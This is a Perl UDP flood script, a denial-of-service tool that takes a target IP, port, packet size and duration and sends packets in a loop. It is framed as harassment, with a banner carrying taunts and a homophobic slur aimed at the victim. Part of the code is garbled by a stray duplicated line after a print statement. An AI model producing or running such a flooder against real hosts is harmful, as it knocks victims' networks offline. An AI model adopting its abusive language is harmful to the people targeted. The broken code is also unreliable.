#!/usr/bin/perl
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# @OmgItzAdamcfw
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print BOLD BLUE <<EOTEXT;
               
       

 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_NIKE
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_JUST DO IT
¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶§§§1§§¶¶_NIKE 
¶¶¶¶¶¶_§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶§1___1§§¶¶¶¶¶_JUST DO IT
¶¶¶¶§__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶§1______§¶¶¶¶¶¶¶¶¶¶_NIKE 
¶¶¶§___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶§§1_______1§¶¶¶¶¶¶¶¶¶¶¶¶¶¶_JUST DO IT
¶¶¶____1¶¶¶¶¶¶¶¶¶¶§11_________1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_NIKEIDS
¶¶_______11111____________§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_FUCK
¶¶____________________§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_YO 
¶¶_______________1§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_MAMA
¶¶¶__________1§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_SWAT
¶¶¶¶¶¶§§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
         +                 Adam is about to make you                 +                   
         +                     hold these packets                      +
         ===============================================================
         +            Stop Slamming This faggots Router                +
         +                      With Ctrl+C                            +
         +                  Made By: Traplncc                       +
         ===============================================================
EOTEXT
 
 print           "                      <<<Should've stopped flexing>>> $ip
                        On port " .
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit to big daddy? Bad Idea! ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit to big daddy Wrong! ") . "\n";
        print "Stop DoSing with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
